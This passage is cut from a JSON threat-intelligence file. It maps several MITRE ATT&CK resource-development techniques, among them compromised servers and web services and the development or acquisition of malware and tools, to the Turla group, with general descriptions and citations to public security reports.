        "url": "https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf",
        "description": "NSA/NCSC. (2019, October 21). Cybersecurity Advisory: Turla Group Exploits Iranian APT To Expand Coverage Of Victims. Retrieved October 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ThreatConnect Infrastructure Dec 2020",
        "url": "https://threatconnect.com/blog/infrastructure-research-hunting/",
        "description": "ThreatConnect. (2020, December 15). Infrastructure Research and Hunting: Boiling the Domain Ocean. Retrieved October 12, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant SCANdalous Jul 2020",
        "url": "https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation",
        "description": "Stephens, A. (2020, July 13). SCANdalous! (External Detection Using Network Scan Data and Automation). Retrieved October 12, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Koczwara Beacon Hunting Sep 2021",
        "url": "https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2",
        "description": "Koczwara, M. (2021, September 7). Hunting Cobalt Strike C2 with Shodan. Retrieved October 12, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5",
    "platform": "pre",
    "tid": "T1584.004",
    "technique": "Server",
    "tactic": "resource-development",
    "datasources": "response-content|response-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
    "technique_references": [
      {
        "source_name": "ThreatConnect Infrastructure Dec 2020",
        "url": "https://threatconnect.com/blog/infrastructure-research-hunting/",
        "description": "ThreatConnect. (2020, December 15). Infrastructure Research and Hunting: Boiling the Domain Ocean. Retrieved October 12, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant SCANdalous Jul 2020",
        "url": "https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation",
        "description": "Stephens, A. (2020, July 13). SCANdalous! (External Detection Using Network Scan Data and Automation). Retrieved October 12, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Koczwara Beacon Hunting Sep 2021",
        "url": "https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2",
        "description": "Koczwara, M. (2021, September 7). Hunting Cobalt Strike C2 with Shodan. Retrieved October 12, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2",
    "platform": "pre",
    "tid": "T1584.006",
    "technique": "Web Services",
    "tactic": "resource-development",
    "datasources": "response-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.",
    "technique_references": [
      {
        "source_name": "Recorded Future Turla Infra 2020",
        "url": "https://www.recordedfuture.com/turla-apt-infrastructure/",
        "description": "Insikt Group. (2020, March 12). Swallowing the Snake’s Tail: Tracking Turla Infrastructure. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ThreatConnect Infrastructure Dec 2020",
        "url": "https://threatconnect.com/blog/infrastructure-research-hunting/",
        "description": "ThreatConnect. (2020, December 15). Infrastructure Research and Hunting: Boiling the Domain Ocean. Retrieved October 12, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0",
    "platform": "pre",
    "tid": "T1587.001",
    "technique": "Malware",
    "tactic": "resource-development",
    "datasources": "malware-content|malware-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",
    "technique_references": [
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Sofacy",
        "url": "https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/",
        "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, December 4). Sofacy APT hits high profile targets with updated toolset. Retrieved December 10, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "ActiveMalwareEnergy",
        "url": "https://arstechnica.com/information-technology/2014/06/active-malware-operation-let-attackers-sabotage-us-energy-industry/",
        "description": "Dan Goodin. (2014, June 30). Active malware operation let attackers sabotage US energy industry. Retrieved March 9, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FBI Flash FIN7 USB",
        "url": "https://therecord.media/fbi-fin7-hackers-target-us-companies-with-badusb-devices-to-install-ransomware/",
        "description": "The Record. (2022, January 7). FBI: FIN7 hackers target US companies with BadUSB devices to install ransomware. Retrieved January 14, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye APT29",
        "url": "https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf",
        "description": "FireEye Labs. (2015, July). HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group. Retrieved September 17, 2015.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970",
    "platform": "pre",
    "tid": "T1588.001",
    "technique": "Malware",
    "tactic": "resource-development",
    "datasources": "malware-content|malware-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
    "technique_references": [
      {
        "source_name": "FireEyeSupplyChain",
        "url": "https://www.mandiant.com/resources/supply-chain-analysis-from-quartermaster-to-sunshop",
        "description": "FireEye. (2014). SUPPLY CHAIN ANALYSIS: From Quartermaster to SunshopFireEye. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
    "platform": "pre",
    "tid": "T1588.002",
    "technique": "Tool",
    "tactic": "resource-development",
    "datasources": "malware-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
    "technique_references": [
      {
        "source_name": "Recorded Future Beacon 2019",
        "url": "https://www.recordedfuture.com/identifying-cobalt-strike-servers/",
        "description": "Recorded Future. (2019, June 20). Out of the Blue: How Recorded Future Identified Rogue Cobalt Strike Servers. Retrieved October 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Analyzing CS Dec 2020",
        "url": "https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/",
        "description": "Maynier, E. (2020, December 20). Analyzing Cobalt Strike for Fun and Profit. Retrieved October 12, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  }
]
